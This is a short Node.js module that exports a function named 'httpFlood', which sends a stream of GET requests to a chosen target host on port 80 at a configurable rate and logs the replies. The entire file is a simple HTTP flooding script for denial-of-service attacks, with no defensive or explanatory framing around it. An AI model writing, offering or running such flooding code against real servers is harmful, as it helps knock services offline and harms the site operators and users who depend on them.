const http = require('http');

function httpFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const req = http.request({
            hostname: target,
            port: 80,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.on('data', (chunk) => {
                logOutput('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            logOutput('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

module.exports = httpFlood;
